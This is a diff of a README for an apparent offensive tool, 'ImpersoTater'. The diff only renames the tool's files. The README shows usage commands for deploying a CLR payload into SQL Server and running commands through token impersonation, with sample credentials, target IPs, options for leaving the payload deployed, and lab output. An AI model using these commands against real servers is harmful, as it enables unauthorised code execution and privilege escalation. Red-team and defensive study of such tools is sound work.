@@ -18,22 +18,22 @@ No executable is written to disk. The entire payload runs inside `sqlservr.exe` 
 
 ```
 # Impacket-style target string
-python3 impersotater.py ecorp.local/veeam-admin:'B@ckupP@ssw0rd'@192.168.15.42 -c "whoami"
+python3 ImpersoTater.py ecorp.local/veeam-admin:'B@ckupP@ssw0rd'@192.168.15.42 -c "whoami"
 
 # Explicit parameters
-python3 impersotater.py -t 192.168.15.42 -u sa -p Password1 -c "whoami /all"
+python3 ImpersoTater.py -t 192.168.15.42 -u sa -p Password1 -c "whoami /all"
 
 # SQL authentication
-python3 impersotater.py -t 10.0.0.5 -u sa -p Password1 -c "net localgroup administrators"
+python3 ImpersoTater.py -t 10.0.0.5 -u sa -p Password1 -c "net localgroup administrators"
 
 # Select technique
-python3 impersotater.py ecorp/admin:Pass@10.0.0.5 -c "whoami" --technique spooler
+python3 ImpersoTater.py ecorp/admin:Pass@10.0.0.5 -c "whoami" --technique spooler
 
 # Enumerate only (no exploitation)
-python3 impersotater.py ecorp/admin:Pass@10.0.0.5 -c x --enum-only
+python3 ImpersoTater.py ecorp/admin:Pass@10.0.0.5 -c x --enum-only
 
 # Leave assembly deployed for multiple commands
-python3 impersotater.py ecorp/admin:Pass@10.0.0.5 -c "whoami" --no-cleanup
+python3 ImpersoTater.py ecorp/admin:Pass@10.0.0.5 -c "whoami" --no-cleanup
 ```
 
 ### Options
@@ -81,7 +81,7 @@ Tries `spooler` first (if the Print Spooler service is running), falls back to `
 ## Lab Example
 
 ```
-$ python3 impersotater.py ecorp.local/veeam-admin:'B@ckupP@ssw0rd'@192.168.15.42 -c "whoami && hostname"
+$ python3 ImpersoTater.py ecorp.local/veeam-admin:'B@ckupP@ssw0rd'@192.168.15.42 -c "whoami && hostname"
 [*] Connecting to 192.168.15.42:1433...
 [+] Connected
 
@@ -116,9 +116,9 @@ Target: SQL Server 2022 Developer Edition on Windows Server 2019 Datacenter, ser
 
 | File | Description |
 |------|-------------|
-| `impersotater.py` | Python CLI tool — handles connection, compilation, deployment, execution, cleanup |
-| `impersotater.cs` | C# payload — handle enumeration, token hunting, process creation |
-| `impersotater_sql.cs` | CLR wrapper — SQL stored procedure that calls the payload and returns output via TDS |
+| `ImpersoTater.py` | Python CLI tool — handles connection, compilation, deployment, execution, cleanup |
+| `ImpersoTater.cs` | C# payload — handle enumeration, token hunting, process creation |
+| `ImpersoTater_sql.cs` | CLR wrapper — SQL stored procedure that calls the payload and returns output via TDS |
 
 ## Cleanup
 
